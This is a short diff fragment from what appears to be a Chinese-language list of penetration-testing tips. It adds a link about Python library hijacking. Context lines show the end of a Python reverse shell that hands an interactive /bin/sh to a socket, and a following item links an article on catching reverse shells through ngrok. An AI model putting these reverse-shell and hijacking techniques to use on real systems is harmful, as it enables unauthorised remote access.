@@ -339,4 +339,6 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
+变种方法：[Python Library Hijacking on Linux](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
+
 45. 使用ngrok转发tcp端口,实现反弹远程shell。[How to catch a Reverse shell over the Internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)
